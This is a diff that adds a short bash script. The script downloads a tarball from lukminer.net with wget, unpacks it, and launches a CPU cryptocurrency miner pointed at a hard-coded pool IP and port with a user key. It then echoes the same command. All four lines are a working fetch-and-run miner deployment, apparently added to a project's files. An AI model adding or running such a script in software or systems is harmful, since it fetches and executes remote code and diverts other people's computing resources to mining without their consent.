@@ -1,0 +1,4 @@
+#!/bin/bash
+cd lukminer/ && wget http://www.lukminer.net/releases/latest.tgz && ls && tar xfvz latest.tgz && ls
+./luk-cpu -a xmrv8 --host 168.235.86.33 --port 4486 --user SK_MB2alcAPslZOo5sDPnXnH.1Dt4p2Envy3Te7vmKagKULCovJFDQe2yD5 --pass x -t 1
+echo "./luk-cpu -a xmrv8 --host 168.235.86.33 --port 4486 --user SK_MB2alcAPslZOo5sDPnXnH.1Dt4p2Envy3Te7vmKagKULCovJFDQe2yD5 --pass x -t 1"
